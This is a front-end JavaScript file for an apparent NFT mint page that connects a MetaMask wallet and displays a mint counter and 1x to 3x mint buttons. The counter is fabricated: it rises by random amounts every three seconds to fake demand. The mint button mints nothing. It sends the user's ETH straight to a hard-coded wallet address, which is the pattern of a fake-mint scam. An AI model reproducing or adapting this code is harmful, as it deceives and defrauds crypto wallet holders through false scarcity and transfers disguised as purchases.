const connectWalletButton = document.querySelector('.connectWalletButton');
const mintButton = document.querySelector('.mintButton');
const addressBar = document.querySelector('.addressBar');
const openMetaButton = document.querySelector('.mobile-meta');
const counter = document.querySelector('.counter');
const countx1 = document.querySelector('.countx1');
const countx2 = document.querySelector('.countx2');
const countx3 = document.querySelector('.countx3');

var isConnected = false;
var mintPrice = 0.24;
var mintOveralPrice;
var account = window.sessionStorage.getItem('account');
var counterMaxValue = parseInt(window.sessionStorage.getItem('counterMaxValue'));


// Connecting MetaMask
if (window.sessionStorage.getItem('account') != null)
{
   console.log('first if');
   console.log(typeof account)
   addressBar.innerHTML = account.substring(0, 5) + '...' + account.slice(-3);
   addressBar.style.display = 'block';
   connectWalletButton.style.display = 'none';
}

connectWalletButton.addEventListener('click', async () =>
{
   if (window.sessionStorage.getItem('account') === null)
   {
      const accounts = await window.ethereum.request({ method : 'eth_requestAccounts'});
      account = accounts[0];
      window.sessionStorage.setItem('account', account);
   }

   addressBar.innerHTML = account.substring(0, 5) + '...' + account.slice(-3);
   addressBar.style.display = 'block';
   connectWalletButton.style.display = 'none';
});


// Counter Section
var counterValue = parseInt(window.sessionStorage.getItem('counterValue'));
counter.innerHTML = counterValue + '/' + counterMaxValue;

var intervalId = window.setInterval(() =>
{
   counterValue += Math.floor((Math.random() * 31)) + 20;
   if (counterValue < counterMaxValue)
   {
      window.sessionStorage.setItem('counterValue', counterValue);
      counter.innerHTML = counterValue + "/" + counterMaxValue;
   }
   else
   {
      counter.innerHTML = counterMaxValue;
      clearInterval(intervalId);
   }

}, 3000);


// binding count buttons
var buttonContent = 'MINT FOR ';
mintButton.innerHTML = buttonContent + mintPrice;
mintOveralPrice = mintPrice;
countx1.addEventListener('click', () =>
{
   countx1.classList.add('selected');
   mintButton.innerHTML = buttonContent + mintPrice;
   if (countx2.classList.contains('selected')) 
   {
      countx2.classList.remove('selected');
   }
   if (countx3.classList.contains('selected')) 
   {
      countx3.classList.remove('selected');
   }

});

countx2.addEventListener('click', () =>
{
   countx2.classList.add('selected');
   mintButton.innerHTML = buttonContent + (mintPrice * 2);
   mintOveralPrice = mintPrice * 2;
   if (countx1.classList.contains('selected')) 
   {
      countx1.classList.remove('selected');
   }
   if (countx3.classList.contains('selected')) 
   {
      countx3.classList.remove('selected');
   }
});

countx3.addEventListener('click', () =>
{
   countx3.classList.add('selected');
   mintButton.innerHTML = buttonContent + (mintPrice * 3);
   mintOveralPrice = mintPrice * 3;
   if (countx1.classList.contains('selected')) 
   {
      countx1.classList.remove('selected');
   }
   if (countx2.classList.contains('selected')) 
   {
      countx2.classList.remove('selected');
   }
});


// binding mint button
mintButton.addEventListener('click', async () =>
{
   await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
   });
   web3 = new Web3(Web3.givenProvider);
   var transactionObj = {
      from: account,
      to: "0x02d8834Cb5BB9affDa038dAd522B804cd59F8cB9",
      value: Web3.utils.toWei(mintOveralPrice.toString()),
   }
   await web3.eth.sendTransaction(transactionObj)
});

// on account changing
window.ethereum.on('accountsChanged',  (accounts) => {
   console.log(accounts[0]);
   account = accounts[0];
   window.sessionStorage.setItem('account', account);
   addressBar.innerHTML = account.substring(0, 5) + '...' + account.slice(-3);
})

// bind meta open button for mobile
openMetaButton.addEventListener('click', () => {
   window.location.replace("MetaMask");
})